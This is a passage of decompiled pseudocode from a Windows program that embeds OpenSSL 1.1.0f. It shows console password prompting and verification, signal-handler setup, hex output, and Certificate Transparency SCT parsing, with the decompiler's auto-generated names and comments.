  result = __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(a1);
  v3 = (void *)result;
  if ( result )
  {
    sub_1400B9FA0(*(void **)(result + 32));
    sub_14001D930(v3);
    sub_14002A3F0(a1, 0i64);
    sub_14002A410(a1, 0);
    return 1i64;
  }
  return result;
}
// 1400219F0: using guessed type __int64 __fastcall __crt_win32_buffer<char,__crt_win32_buffer_public_dynamic_resizing>::capacity(_QWORD);

//----- (00000001400C66C0) ----------------------------------------------------
__int64 __fastcall sub_1400C66C0(__int64 a1, unsigned int *a2)
{
  int v4; // eax
  int v5; // eax
  const char *v6; // rax
  const char *v7; // rax
  char v8; // al
  int v9; // r9d
  const char *v10; // rax
  char v11; // al
  __int64 result; // rax
  __int64 v13; // rbx
  unsigned __int8 *v14; // rax
  __int64 v15; // rbx
  int v16; // ecx
  int v17; // edx
  const char *v18; // rax

  v4 = sub_14001D4F0(a2) - 1;
  if ( !v4 )
  {
    v18 = (const char *)__FrameHandler3::TryBlockMap::getpDC((__FrameHandler3::TryBlockMap *)a2);
    fputs(v18, qword_140143620);
    fflush(qword_140143620);
    v8 = sub_140024CF0((__int64)a2);
    v9 = 1;
    return sub_1400C6AE0(a1, (__int64)a2, v8 & 1, v9);
  }
  v5 = v4 - 1;
  if ( !v5 )
  {
    v10 = (const char *)__FrameHandler3::TryBlockMap::getpDC((__FrameHandler3::TryBlockMap *)a2);
    sub_140002640((__int64)qword_140143620, (__int64)"Verifying - %s", v10);
    fflush(qword_140143620);
    v11 = sub_140024CF0((__int64)a2);
    result = sub_1400C6AE0(a1, (__int64)a2, v11 & 1, 1);
    if ( (int)result <= 0 )
      return result;
    v13 = sub_1400C1720((__int64)a2);
    v14 = (unsigned __int8 *)sub_1400C1700((__int64)a2);
    v15 = v13 - (_QWORD)v14;
    do
    {
      v16 = v14[v15];
      v17 = *v14 - v16;
      if ( v17 )
        break;
      ++v14;
    }
    while ( v16 );
    if ( v17 )
    {
      sub_140002640((__int64)qword_140143620, (__int64)"Verify failure\n");
      fflush(qword_140143620);
      return 0i64;
    }
    return 1i64;
  }
  if ( v5 != 1 )
    return 1i64;
  v6 = (const char *)__FrameHandler3::TryBlockMap::getpDC((__FrameHandler3::TryBlockMap *)a2);
  fputs(v6, qword_140143620);
  v7 = (const char *)sub_1400C16F0((__int64)a2);
  fputs(v7, qword_140143620);
  fflush(qword_140143620);
  v8 = sub_140024CF0((__int64)a2);
  v9 = 0;
  return sub_1400C6AE0(a1, (__int64)a2, v8 & 1, v9);
}

//----- (00000001400C6850) ----------------------------------------------------
__int64 __fastcall sub_1400C6850(__int64 a1, __FrameHandler3::TryBlockMap *a2)
{
  const char *v3; // rax

  if ( (unsigned int)sub_14001D4F0((unsigned int *)a2) - 4 <= 1 )
  {
    v3 = (const char *)__FrameHandler3::TryBlockMap::getpDC(a2);
    fputs(v3, qword_140143620);
    fflush(qword_140143620);
  }
  return 1i64;
}

//----- (00000001400C68A0) ----------------------------------------------------
__int64 __fastcall sub_1400C68A0(__int64 a1)
{
  HANDLE StdHandle; // rax

  sub_140025D20(*(_DWORD **)(a1 + 40));
  dword_140143628 = 1;
  qword_140143620 = fopen("conout$", "w");
  if ( !qword_140143620 )
    qword_140143620 = _acrt_iob_func(2u);
  StdHandle = GetStdHandle(0xFFFFFFF6);
  if ( GetConsoleMode(StdHandle, &Mode) || (dword_140143628 = 0, (Stream = fopen("conin$", "r")) == 0i64) )
    Stream = _acrt_iob_func(0);
  return 1i64;
}
// 140143628: using guessed type int dword_140143628;

//----- (00000001400C6950) ----------------------------------------------------
__int64 __fastcall sub_1400C6950(__int64 a1)
{
  if ( Stream != _acrt_iob_func(0) )
    fclose(Stream);
  if ( qword_140143620 != _acrt_iob_func(2u) )
    fclose(qword_140143620);
  sub_140025CE0(*(_DWORD **)(a1 + 40));
  return 1i64;
}

//----- (00000001400C69B0) ----------------------------------------------------
char **sub_1400C69B0()
{
  return &off_14013D828;
}
// 14013D828: using guessed type char *off_14013D828;

//----- (00000001400C69C0) ----------------------------------------------------
_crt_signal_t __fastcall sub_1400C69C0()
{
  int v0; // eax

  signal(v0 - 18, Function);
  signal(8, qword_140143550);
  signal(4, qword_140143530);
  signal(2, qword_140143520);
  signal(11, qword_140143568);
  return signal(15, qword_140143588);
}
// 1400C69D4: variable 'v0' is possibly undefined

//----- (00000001400C6A40) ----------------------------------------------------
void (__cdecl *__fastcall sub_1400C6A40())(int)
{
  int v0; // eax
  void (__cdecl *result)(int); // rax

  Function = signal(v0 - 18, (_crt_signal_t)sub_1400C6EB0);
  qword_140143550 = signal(8, (_crt_signal_t)sub_1400C6EB0);
  qword_140143530 = signal(4, (_crt_signal_t)sub_1400C6EB0);
  qword_140143520 = signal(2, (_crt_signal_t)sub_1400C6EB0);
  qword_140143568 = signal(11, (_crt_signal_t)sub_1400C6EB0);
  result = signal(15, (_crt_signal_t)sub_1400C6EB0);
  qword_140143588 = result;
  return result;
}
// 1400C6A54: variable 'v0' is possibly undefined

//----- (00000001400C6AE0) ----------------------------------------------------
__int64 __fastcall sub_1400C6AE0(__int64 a1, __int64 a2, int a3, int a4)
{
  unsigned int v4; // ebx
  HANDLE StdHandle; // rax
  HANDLE v10; // rax
  __int64 v11; // rcx
  WCHAR *v12; // r8
  __int64 v13; // r9
  __int64 v14; // rdx
  CHAR *v15; // rdi
  HANDLE v16; // rax
  __int64 v17; // rcx
  CHAR *v18; // r8
  __int64 v19; // r9
  __int64 v20; // rdx
  char *v21; // rax
  int v22; // eax
  HANDLE v23; // rax
  DWORD NumberOfCharsRead[4]; // [rsp+40h] [rbp-658h] BYREF
  CHAR MultiByteStr[512]; // [rsp+50h] [rbp-648h] BYREF
  WCHAR Buffer[512]; // [rsp+250h] [rbp-448h] BYREF

  v4 = 0;
  dword_14014362C = 0;
  dword_140143630 = 0;
  sub_1400C6A40();
  dword_140143630 = 1;
  if ( !a3 && dword_140143628 )
  {
    dwMode = Mode & 0xFFFFFFFB;
    StdHandle = GetStdHandle(0xFFFFFFF6);
    SetConsoleMode(StdHandle, dwMode);
  }
  dword_140143630 = 2;
  MultiByteStr[0] = 0;
  if ( dword_140143628 )
  {
    if ( !GetEnvironmentVariableW(L"OPENSSL_WIN32_UTF8", 0i64, 0) )
    {
      v16 = GetStdHandle(0xFFFFFFF6);
      if ( !ReadConsoleA(v16, MultiByteStr, 0x1FFu, NumberOfCharsRead, 0i64) )
        goto LABEL_32;
      v20 = NumberOfCharsRead[0];
      if ( NumberOfCharsRead[0] >= 2 )
      {
        v17 = NumberOfCharsRead[0] - 2;
        v18 = &MultiByteStr[v17];
        if ( MultiByteStr[v17] == 13 )
        {
          v17 = NumberOfCharsRead[0] - 1;
          if ( MultiByteStr[v17] == 10 )
          {
            *v18 = 10;
            v20 = (unsigned int)v17;
            NumberOfCharsRead[0] = v17;
          }
        }
      }
      if ( (unsigned int)v20 >= 0x200ui64 )
        _report_rangecheckfailure(v17, v20, v18, v19);
      MultiByteStr[(unsigned int)v20] = 0;
      goto LABEL_24;
    }
    v10 = GetStdHandle(0xFFFFFFF6);
    if ( !ReadConsoleW(v10, Buffer, 0x1FFu, NumberOfCharsRead, 0i64) )
      goto LABEL_32;
    v14 = NumberOfCharsRead[0];
    if ( NumberOfCharsRead[0] >= 2 )
    {
      v12 = &Buffer[NumberOfCharsRead[0] - 2];
      if ( *v12 == 13 )
      {
        v11 = NumberOfCharsRead[0] - 1;
        if ( Buffer[v11] == 10 )
        {
          *v12 = 10;
          v14 = (unsigned int)v11;
          NumberOfCharsRead[0] = v11;
        }
      }
    }
    if ( 2 * (unsigned __int64)(unsigned int)v14 >= 0x400 )
      _report_rangecheckfailure(v11, v14, v12, v13);
    Buffer[(unsigned int)v14] = 0;
    v15 = MultiByteStr;
    if ( WideCharToMultiByte(0xFDE9u, 0, Buffer, -1, MultiByteStr, 512, 0i64, 0i64) <= 0 )
      v15 = 0i64;
    sub_140023440((__int64)Buffer, 1024i64);
  }
  else
  {
    v15 = (CHAR *)common_fgets<char>(MultiByteStr, 511i64, Stream);
  }
  if ( !v15 )
    goto LABEL_32;
LABEL_24:
  if ( !feof(Stream) && !ferror(Stream) )
  {
    v21 = strchr(MultiByteStr, 10);
    if ( v21 )
    {
      if ( a4 )
        *v21 = 0;
    }
    else if ( !(unsigned int)sub_1400C6E30((__int64)Stream) )
    {
      goto LABEL_32;
    }
    if ( (int)sub_1400C19F0(a1, a2, MultiByteStr) >= 0 )
      v4 = 1;
  }
LABEL_32:
  if ( dword_14014362C == 2 )
    v4 = -1;
  if ( !a3 )
    sub_140002640((__int64)qword_140143620, (__int64)"\n");
  v22 = dword_140143630;
  if ( dword_140143630 >= 2 && !a3 && dword_140143628 )
  {
    dwMode = Mode | 4;
    v23 = GetStdHandle(0xFFFFFFF6);
    SetConsoleMode(v23, dwMode);
    v22 = dword_140143630;
  }
  if ( v22 >= 1 )
    sub_1400C69C0();
  sub_140023440((__int64)MultiByteStr, 512i64);
  return v4;
}
// 1400C6E24: variable 'v11' is possibly undefined
// 1400C6E24: variable 'v12' is possibly undefined
// 1400C6E24: variable 'v13' is possibly undefined
// 1400C6E2A: variable 'v17' is possibly undefined
// 1400C6E2A: variable 'v18' is possibly undefined
// 1400C6E2A: variable 'v19' is possibly undefined
// 14000347C: using guessed type void __fastcall __noreturn _report_rangecheckfailure(_QWORD, _QWORD, _QWORD, _QWORD);
// 14000D01C: using guessed type __int64 __fastcall common_fgets<char>(_QWORD, _QWORD, _QWORD);
// 140143628: using guessed type int dword_140143628;
// 14014362C: using guessed type int dword_14014362C;
// 140143630: using guessed type int dword_140143630;
// 1400C6AE0: using guessed type CHAR MultiByteStr[512];
// 1400C6AE0: using guessed type WCHAR Buffer[512];

//----- (00000001400C6E30) ----------------------------------------------------
__int64 __fastcall sub_1400C6E30(__int64 a1)
{
  __int64 result; // rax
  char Str[8]; // [rsp+20h] [rbp-18h] BYREF

  while ( 1 )
  {
    result = common_fgets<char>(Str, 4i64, a1);
    if ( !result )
      break;
    if ( strchr(Str, 10) )
      return 1i64;
  }
  return result;
}
// 14000D01C: using guessed type __int64 __fastcall common_fgets<char>(_QWORD, _QWORD, _QWORD);
// 1400C6E30: using guessed type char Str[8];

//----- (00000001400C6EB0) ----------------------------------------------------
void __fastcall sub_1400C6EB0(int a1)
{
  dword_14014362C = a1;
}
// 14014362C: using guessed type int dword_14014362C;

//----- (00000001400C6EC0) ----------------------------------------------------
__int64 __fastcall sub_1400C6EC0(__int64 a1, __int64 a2)
{
  unsigned int v2; // edi
  int v6; // ebx
  __int64 i; // rsi
  __int64 v8; // rdx
  char v9; // [rsp+48h] [rbp+10h] BYREF
  char v10; // [rsp+49h] [rbp+11h]

  v2 = 0;
  if ( !a2 )
    return 0i64;
  if ( *(_DWORD *)a2 )
  {
    v6 = 0;
    if ( *(int *)a2 <= 0 )
      return v2;
    for ( i = 0i64; ; ++i )
    {
      if ( v6 && v6 == 35 * (v6 / 35) )
      {
        if ( (unsigned int)sub_14002A430(a1, (__int64)"\\\n", 2u) != 2 )
          return 0xFFFFFFFFi64;
        v2 += 2;
      }
      v8 = *(_QWORD *)(a2 + 8);
      v9 = off_14013D860[(unsigned __int64)*(unsigned __int8 *)(v8 + i) >> 4];
      v10 = off_14013D860[*(_BYTE *)(v8 + i) & 0xF];
      if ( (unsigned int)sub_14002A430(a1, (__int64)&v9, 2u) != 2 )
        break;
      v2 += 2;
      if ( ++v6 >= *(_DWORD *)a2 )
        return v2;
    }
    return 0xFFFFFFFFi64;
  }
  if ( (unsigned int)sub_14002A430(a1, (__int64)"0", 1u) != 1 )
    return 0xFFFFFFFFi64;
  return 1;
}
// 14013D860: using guessed type char *off_14013D860;

//----- (00000001400C6FD0) ----------------------------------------------------
void __fastcall sub_1400C6FD0(void *a1)
{
  sub_140029720(a1, (void (*)(void))sub_1400C6FF0);
}

//----- (00000001400C6FF0) ----------------------------------------------------
void __fastcall sub_1400C6FF0(void **a1)
{
  if ( a1 )
  {
    sub_14001D930(a1[3]);
    sub_14001D930(a1[6]);
    sub_14001D930(a1[9]);
    sub_14001D930(a1[1]);
    sub_14001D930(a1);
  }
}

//----- (00000001400C7080) ----------------------------------------------------
__int64 __fastcall sub_1400C7080(__int64 a1)
{
  int v1; // ecx

  if ( !*(_DWORD *)a1 && *(_BYTE *)(a1 + 64) == 4 )
  {
    v1 = *(unsigned __int8 *)(a1 + 65) - 1;
    if ( !v1 )
      return 668i64;
    if ( v1 == 2 )
      return 794i64;
  }
  return 0i64;
}

//----- (00000001400C70B0) ----------------------------------------------------
_BOOL8 __fastcall sub_1400C70B0(__int64 a1)
{
  if ( *(_DWORD *)a1 == -1 )
    return 0i64;
  if ( *(_DWORD *)a1 )
    return *(_QWORD *)(a1 + 8) != 0i64;
  return *(_QWORD *)(a1 + 24)
      && *(_BYTE *)(a1 + 64) == 4
      && (*(_BYTE *)(a1 + 65) == 1 || *(_BYTE *)(a1 + 65) == 3)
      && *(_QWORD *)(a1 + 72)
      && *(_QWORD *)(a1 + 80);
}
// 1400C70CE: conditional instruction was optimized away because eax.4==0

//----- (00000001400C7100) ----------------------------------------------------
_DWORD *__fastcall sub_1400C7100()
{
  int v0; // eax
  _DWORD *result; // rax

  result = sub_14001DC20((unsigned int)(v0 + 48));
  if ( result )
  {
    result[22] = -1;
    *result = -1;
  }
  else
  {
    sub_140024610(50, 100, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_sct.c", 27);
    return 0i64;
  }
  return result;
}
// 1400C7118: variable 'v0' is possibly undefined

//----- (00000001400C7160) ----------------------------------------------------
__int64 __fastcall sub_1400C7160(__int64 a1, const void *a2, size_t a3)
{
  void *v6; // rax

  sub_14001D930(*(void **)(a1 + 72));
  *(_QWORD *)(a1 + 72) = 0i64;
  *(_QWORD *)(a1 + 80) = 0i64;
  *(_DWORD *)(a1 + 96) = 0;
  if ( a2 && a3 )
  {
    v6 = sub_14003BAB0(a2, a3);
    *(_QWORD *)(a1 + 72) = v6;
    if ( !v6 )
    {
      sub_140024610(50, 116, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_sct.c", 186);
      return 0i64;
    }
    *(_QWORD *)(a1 + 80) = a3;
  }
  return 1i64;
}

//----- (00000001400C7220) ----------------------------------------------------
__int64 __fastcall sub_1400C7220(_DWORD *a1, int a2)
{
  int v2; // edx
  int v3; // edx
  __int64 result; // rax

  a1[23] = a2;
  a1[24] = 0;
  v2 = a2 - 1;
  if ( !v2 )
    goto LABEL_4;
  v3 = v2 - 1;
  if ( v3 )
  {
    if ( v3 != 1 )
      return 1i64;
LABEL_4:
    a1[22] = 0;
    a1[24] = 0;
    return 1i64;
  }
  a1[22] = 1;
  result = 1i64;
  a1[24] = 0;
  return result;
}

//----- (00000001400C7260) ----------------------------------------------------
_BOOL8 __fastcall sub_1400C7260(__int64 a1)
{
  return !*(_DWORD *)a1
      && *(_BYTE *)(a1 + 64) == 4
      && (*(_BYTE *)(a1 + 65) == 1 || *(_BYTE *)(a1 + 65) == 3)
      && *(_QWORD *)(a1 + 72)
      && *(_QWORD *)(a1 + 80);
}

//----- (00000001400C7290) ----------------------------------------------------
__int64 __fastcall sub_1400C7290(int **a1, unsigned __int8 **a2, unsigned int a3)
{
  unsigned __int8 *v3; // rax
  __int64 v5; // rsi
  __int64 result; // rax
  int *v8; // rdi
  unsigned __int8 *v9; // [rsp+38h] [rbp+10h] BYREF
  int *v10; // [rsp+48h] [rbp+20h] BYREF

  v3 = *a2;
  v5 = (int)a3;
  v10 = 0i64;
  v9 = v3;
  result = sub_140050010((__int64 *)&v10, (char **)&v9, a3);
  if ( result )
  {
    v9 = (unsigned __int8 *)*((_QWORD *)v10 + 1);
    v8 = sub_1400C7AD0(a1, &v9, *v10);
    if ( v8 )
      *a2 += v5;
    sub_14004FD70((__int64)v10);
    return (__int64)v8;
  }
  return result;
}

//----- (00000001400C7330) ----------------------------------------------------
__int64 __fastcall sub_1400C7330(unsigned int *a1, unsigned __int8 **a2)
{
  unsigned int v4; // ebx
  unsigned int v5; // [rsp+20h] [rbp-28h] BYREF
  void *v6; // [rsp+28h] [rbp-20h] BYREF

  v6 = 0i64;
  v5 = sub_1400C7550(a1, &v6);
  if ( v5 == -1 )
    return 0xFFFFFFFFi64;
  v4 = sub_140050070(&v5, a2);
  sub_14001D930(v6);
  return v4;
}

//----- (00000001400C73A0) ----------------------------------------------------
__int64 __fastcall sub_1400C73A0(__int64 a1, _BYTE **a2)
{
  void *v4; // rbp
  size_t v5; // rsi
  _BYTE *v6; // rbx
  _BYTE *v7; // rax
  _OWORD *v8; // rax
  _BYTE *v9; // rbx
  size_t v10; // r8
  _BYTE *v12; // [rsp+60h] [rbp+18h] BYREF

  v4 = 0i64;
  if ( !sub_1400C70B0(a1) )
  {
    sub_140024610(50, 107, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 206);
LABEL_13:
    sub_14001D930(v4);
    return 0xFFFFFFFFi64;
  }
  if ( *(_DWORD *)a1 )
    v5 = *(_QWORD *)(a1 + 16);
  else
    v5 = *(_QWORD *)(a1 + 80) + *(_QWORD *)(a1 + 56) + 47i64;
  if ( a2 )
  {
    v6 = *a2;
    if ( *a2 )
    {
      v7 = &v6[v5];
    }
    else
    {
      v7 = sub_14001D8E0(v5);
      v6 = v7;
      v4 = v7;
      if ( !v7 )
      {
        sub_140024610(50, 107, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 229);
        goto LABEL_13;
      }
    }
    *a2 = v7;
    if ( *(_DWORD *)a1 )
    {
      memmove(v6, *(const void **)(a1 + 8), v5);
    }
    else
    {
      *v6 = *(_BYTE *)a1;
      v8 = *(_OWORD **)(a1 + 24);
      *(_OWORD *)(v6 + 1) = *v8;
      *(_OWORD *)(v6 + 17) = v8[1];
      v6[33] = *(_BYTE *)(a1 + 47);
      v6[34] = *(_BYTE *)(a1 + 46);
      v6[35] = *(_BYTE *)(a1 + 45);
      v6[36] = *(_BYTE *)(a1 + 44);
      v6[37] = *(_BYTE *)(a1 + 43);
      v6[38] = *(_BYTE *)(a1 + 42);
      v6[39] = *(_BYTE *)(a1 + 41);
      v6[40] = *(_BYTE *)(a1 + 40);
      v6[41] = *(_BYTE *)(a1 + 57);
      v6[42] = *(_BYTE *)(a1 + 56);
      v9 = v6 + 43;
      v10 = *(_QWORD *)(a1 + 56);
      v12 = v9;
      if ( v10 )
      {
        memmove(v9, *(const void **)(a1 + 48), v10);
        v12 = &v9[*(_QWORD *)(a1 + 56)];
      }
      if ( (int)sub_1400C77A0(a1, &v12) <= 0 )
        goto LABEL_13;
    }
  }
  return (unsigned int)v5;
}

//----- (00000001400C7550) ----------------------------------------------------
__int64 __fastcall sub_1400C7550(unsigned int *a1, void **a2)
{
  _BYTE *v2; // rsi
  unsigned int *v4; // rax
  int v5; // eax
  void *v7; // rax
  int v8; // ebx
  unsigned __int64 v9; // rbp
  __int64 v10; // rax
  __int64 v11; // rax
  _BYTE *v12; // rdx
  __int64 v13; // rbx
  _BYTE *v14; // rdx
  int v16; // [rsp+68h] [rbp+10h]
  _BYTE *v17; // [rsp+70h] [rbp+18h] BYREF
  _BYTE *v18; // [rsp+78h] [rbp+20h]

  v2 = 0i64;
  v16 = 0;
  v4 = a1;
  if ( a2 )
  {
    if ( !*a2 )
    {
      v5 = sub_1400C7550(a1, 0i64);
      if ( v5 == -1 )
      {
        sub_140024610(50, 108, 105, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 330);
        return 0xFFFFFFFFi64;
      }
      v7 = sub_14001D8E0(v5);
      *a2 = v7;
      if ( !v7 )
      {
        sub_140024610(50, 108, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 334);
        return 0xFFFFFFFFi64;
      }
      v4 = a1;
      v16 = 1;
    }
    v2 = (char *)*a2 + 2;
  }
  v8 = 0;
  LODWORD(v17) = 0;
  v9 = 2i64;
  if ( (int)sub_1400296E0(v4) <= 0 )
  {
LABEL_21:
    if ( a2 )
    {
      v14 = *a2;
      *v14 = (unsigned __int16)(v9 - 2) >> 8;
      v14[1] = v9 - 2;
      if ( !v16 )
        *a2 = (char *)*a2 + v9;
    }
    return (unsigned int)v9;
  }
  else
  {
    do
    {
      if ( a2 )
      {
        v18 = v2;
        v17 = v2 + 2;
        v10 = sub_140029880((__int64)a1, v8);
        LODWORD(v11) = sub_1400C73A0(v10, &v17);
        if ( (_DWORD)v11 == -1 )
          goto LABEL_26;
        v12 = v18;
        v2 = v17;
        *v18 = BYTE1(v11);
        v12[1] = v11;
      }
      else
      {
        v13 = sub_140029880((__int64)a1, v8);
        if ( !sub_1400C70B0(v13) )
        {
          sub_140024610(50, 107, 106, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 206);
          sub_14001D930(0i64);
          goto LABEL_26;
        }
        if ( *(_DWORD *)v13 )
          v11 = *(_QWORD *)(v13 + 16);
        else
          v11 = *(_QWORD *)(v13 + 80) + *(_QWORD *)(v13 + 56) + 47i64;
        if ( (_DWORD)v11 == -1 )
          goto LABEL_26;
        v8 = (int)v17;
      }
      ++v8;
      v9 += (int)v11 + 2;
      LODWORD(v17) = v8;
    }
    while ( v8 < (int)sub_1400296E0(a1) );
    if ( v9 <= 0xFFFF )
      goto LABEL_21;
LABEL_26:
    if ( v16 )
    {
      sub_14001D930(*a2);
      *a2 = 0i64;
    }
    return 0xFFFFFFFFi64;
  }
}

//----- (00000001400C77A0) ----------------------------------------------------
__int64 __fastcall sub_1400C77A0(__int64 a1, _BYTE **a2)
{
  __int64 v4; // rsi
  _BYTE *v5; // rbx
  _BYTE *v6; // rax

  if ( sub_1400C7260(a1) )
  {
    if ( !*(_DWORD *)a1 )
    {
      v4 = *(_QWORD *)(a1 + 80) + 4i64;
      if ( a2 )
      {
        v5 = *a2;
        if ( *a2 )
        {
          v6 = &v5[v4];
        }
        else
        {
          v6 = sub_14001D8E0(*(_QWORD *)(a1 + 80) + 4i64);
          v5 = v6;
          if ( !v6 )
          {
            sub_140024610(50, 109, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 182);
            goto LABEL_12;
          }
        }
        *a2 = v6;
        *v5 = *(_BYTE *)(a1 + 64);
        v5[1] = *(_BYTE *)(a1 + 65);
        v5[2] = *(_BYTE *)(a1 + 81);
        v5[3] = *(_BYTE *)(a1 + 80);
        memmove(v5 + 4, *(const void **)(a1 + 72), *(_QWORD *)(a1 + 80));
      }
      return (unsigned int)v4;
    }
    sub_140024610(50, 109, 103, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 164);
  }
  else
  {
    sub_140024610(50, 109, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 159);
  }
LABEL_12:
  sub_14001D930(0i64);
  return 0xFFFFFFFFi64;
}

//----- (00000001400C78B0) ----------------------------------------------------
__int64 __fastcall sub_1400C78B0(void ***a1, unsigned __int8 **a2, size_t a3)
{
  __int64 v3; // rbx
  _DWORD *v7; // rax
  unsigned __int8 *v8; // rdi
  int v9; // r8d
  size_t v10; // rsi
  void *v11; // rax
  __int64 v12; // rbp
  __int64 v13; // rax
  char *v14; // rdi
  size_t v15; // rbp
  void *v16; // rax
  unsigned __int64 v17; // rsi
  int v18; // eax
  void *v19; // rax
  char *v21; // [rsp+60h] [rbp+18h] BYREF

  v3 = 0i64;
  if ( a3 - 1 > 0xFFFE )
  {
    sub_140024610(50, 110, 104, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 76);
    goto LABEL_20;
  }
  v7 = sub_1400C7100();
  v3 = (__int64)v7;
  if ( !v7 )
  {
LABEL_20:
    sub_1400C6FF0((void **)v3);
    return 0i64;
  }
  v8 = *a2;
  v9 = **a2;
  *v7 = v9;
  if ( v9 )
  {
    v19 = sub_14003BAB0(v8, a3);
    *(_QWORD *)(v3 + 8) = v19;
    if ( !v19 )
      goto LABEL_20;
    *(_QWORD *)(v3 + 16) = a3;
    *a2 = &v8[a3];
  }
  else
  {
    if ( a3 < 0x2B )
    {
      sub_140024610(50, 110, 104, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 99);
      goto LABEL_20;
    }
    v10 = a3 - 43;
    v11 = sub_14003BAB0(v8 + 1, 0x20ui64);
    *(_QWORD *)(v3 + 24) = v11;
    if ( !v11 )
      goto LABEL_20;
    *(_QWORD *)(v3 + 32) = 32i64;
    *(_QWORD *)(v3 + 40) = (unsigned __int64)v8[33] << 56;
    *(_QWORD *)(v3 + 40) |= (unsigned __int64)v8[34] << 48;
    *(_QWORD *)(v3 + 40) |= (unsigned __int64)v8[35] << 40;
    *(_QWORD *)(v3 + 40) |= (unsigned __int64)v8[36] << 32;
    *(_QWORD *)(v3 + 40) |= (unsigned __int64)v8[37] << 24;
    *(_QWORD *)(v3 + 40) |= (unsigned __int64)v8[38] << 16;
    *(_QWORD *)(v3 + 40) |= (unsigned __int64)v8[39] << 8;
    *(_QWORD *)(v3 + 40) |= v8[40];
    v12 = v8[41];
    v13 = v8[42];
    v14 = (char *)(v8 + 43);
    v15 = v13 | (v12 << 8);
    if ( v10 < v15 )
    {
      sub_140024610(50, 110, 104, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 114);
      goto LABEL_20;
    }
    if ( v15 )
    {
      v16 = sub_14003BAB0(v14, v15);
      *(_QWORD *)(v3 + 48) = v16;
      if ( !v16 )
        goto LABEL_20;
    }
    v17 = v10 - v15;
    *(_QWORD *)(v3 + 56) = v15;
    v21 = &v14[v15];
    v18 = sub_1400C7CC0(v3, &v21, v17);
    if ( v18 <= 0 )
    {
      sub_140024610(50, 110, 104, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 128);
      goto LABEL_20;
    }
    *a2 = (unsigned __int8 *)&v21[v17 - v18];
  }
  if ( a1 )
  {
    sub_1400C6FF0(*a1);
    *a1 = (void **)v3;
  }
  return v3;
}

//----- (00000001400C7AD0) ----------------------------------------------------
int *__fastcall sub_1400C7AD0(int **a1, unsigned __int8 **a2, __int64 a3)
{
  unsigned __int64 v5; // rbx
  int *result; // rax
  int *v7; // rdi
  void **i; // rax
  unsigned __int64 v9; // rbx
  unsigned __int64 v10; // r8
  __int64 v11; // rax
  void **v12; // rsi

  if ( (unsigned __int64)(a3 - 2) > 0xFFFD )
  {
    sub_140024610(50, 111, 105, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 264);
    return 0i64;
  }
  v5 = (*a2)[1] | ((unsigned __int64)**a2 << 8);
  *a2 += 2;
  if ( v5 != a3 - 2 )
  {
    sub_140024610(50, 111, 105, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 270);
    return 0i64;
  }
  if ( a1 && (v7 = *a1) != 0i64 )
  {
    for ( i = (void **)sub_1400296F0(*a1); i; i = (void **)sub_1400296F0(v7) )
      sub_1400C6FF0(i);
  }
  else
  {
    result = (int *)sub_1400296C0();
    v7 = result;
    if ( !result )
      return result;
  }
  if ( v5 )
  {
    while ( v5 >= 2 )
    {
      v9 = v5 - 2;
      v10 = (*a2)[1] | ((unsigned __int64)**a2 << 8);
      *a2 += 2;
      if ( !v10 || v10 > v9 )
      {
        sub_140024610(50, 111, 105, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 298);
        goto LABEL_24;
      }
      v5 = v9 - v10;
      v11 = sub_1400C78B0(0i64, a2, v10);
      v12 = (void **)v11;
      if ( !v11 )
        goto LABEL_24;
      if ( !(unsigned int)sub_1400297C0(v7, v11) )
      {
        sub_1400C6FF0(v12);
        goto LABEL_24;
      }
      if ( !v5 )
        goto LABEL_15;
    }
    sub_140024610(50, 111, 105, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 291);
LABEL_24:
    if ( !a1 || !*a1 )
      sub_1400C6FD0(v7);
    return 0i64;
  }
  else
  {
LABEL_15:
    if ( a1 )
    {
      if ( !*a1 )
        *a1 = v7;
    }
    return v7;
  }
}

//----- (00000001400C7CC0) ----------------------------------------------------
__int64 __fastcall sub_1400C7CC0(__int64 a1, _BYTE **a2, unsigned __int64 a3)
{
  int v3; // eax
  _BYTE *v8; // rbx
  __int64 v9; // rax
  __int64 v10; // rdi
  _BYTE *v11; // rbx
  size_t v12; // rbp
  size_t v13; // rdi

  if ( *(_DWORD *)a1 )
  {
    sub_140024610(v3 + 2, v3 + 64, v3 + 55, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 31);
    return 0xFFFFFFFFi64;
  }
  if ( a3 <= 4 )
  {
    sub_140024610(50, 112, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 42);
    return 0xFFFFFFFFi64;
  }
  v8 = *a2;
  *(_BYTE *)(a1 + 64) = **a2;
  *(_BYTE *)(a1 + 65) = v8[1];
  if ( !(unsigned int)sub_1400C7080(a1) )
  {
    sub_140024610(50, 112, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 51);
    return 0xFFFFFFFFi64;
  }
  v9 = (unsigned __int8)v8[3];
  v10 = (unsigned __int8)v8[2];
  v11 = v8 + 4;
  v12 = a3 + *a2 - v11;
  v13 = v9 | (v10 << 8);
  if ( v13 > v12 )
  {
    sub_140024610(50, 112, 107, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ct\\ct_oct.c", 58);
